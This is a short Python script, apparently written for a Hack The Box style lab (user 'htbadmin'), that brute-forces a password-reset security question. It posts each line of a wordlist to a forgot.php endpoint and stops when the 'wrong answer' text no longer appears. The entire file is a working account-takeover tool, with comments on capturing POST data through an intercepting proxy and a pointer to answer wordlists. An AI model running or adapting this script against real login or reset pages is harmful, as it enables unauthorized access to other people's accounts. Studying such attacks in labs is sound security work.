# This script can be used to brute force common security questions 

import sys
import requests
import os.path

url = "http://securityquestions.com/forgot.php"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# Expected response for invalid submission
invalid = "Sorry, wrong answer"

# Question to bruteforce
question = "What is your favourite color?"

def unpack(fline):
    answer = fline

    return answer

# Submit the web request, change data as needed
def do_req(url, answer, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data
    data = {"answer": answer, "question": question, "userid": "htbadmin", "submit": "answer"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

def check(haystack, needle):
    if needle in haystack:
        return False
    else:
        return True

def main():
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
				# Good generic lists: https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/security-question-answers
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    with open(fname) as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            answer = unpack(fline.rstrip())

            print("[-] Checking word {}".format(answer))
            res = do_req(url, answer, headers)

            if (check(res, invalid)):
                print("[+] Valid answer found: {}".format(answer))
                sys.exit()

if __name__ == "__main__":
    main()
